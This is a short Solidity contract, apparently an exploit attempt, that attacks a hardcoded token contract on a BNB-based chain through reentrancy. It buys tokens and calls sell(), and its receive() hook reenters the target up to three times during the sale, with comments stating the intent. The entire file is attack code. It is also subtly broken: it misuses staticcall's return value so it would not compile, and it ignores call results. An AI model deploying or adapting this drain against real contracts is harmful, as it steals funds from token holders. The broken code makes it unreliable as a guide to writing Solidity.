contract Strategy {
    address constant TARGET = 0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21;

    // Track how many times we've reentered
    uint256 public reentryCount;

    receive() external payable {
        if (reentryCount < 3) {
            reentryCount++;
            // Reenter by buying tokens during the sell
            (bool success,) = TARGET.call{value: msg.value}("");
            // Continue with reentry
        }
    }

    function run() public {
        // First, buy some tokens
        (bool success,) = TARGET.call{value: 5 ether}("");
        require(success, "Initial buy failed");

        // Get our token balance
        bytes memory data = address(TARGET).staticcall(abi.encodeWithSignature("balanceOf(address)", address(this)));
        uint256 balance = abi.decode(data, (uint256));

        // Sell all tokens - this will trigger reentrancy
        (success,) = TARGET.call(abi.encodeWithSignature("sell(uint256)", balance));
        require(success, "Sell failed");

        // Convert any remaining tokens to BNB
        data = address(TARGET).staticcall(abi.encodeWithSignature("balanceOf(address)", address(this)));
        balance = abi.decode(data, (uint256));
        if (balance > 0) {
            (success,) = TARGET.call(abi.encodeWithSignature("sell(uint256)", balance));
        }
    }
}
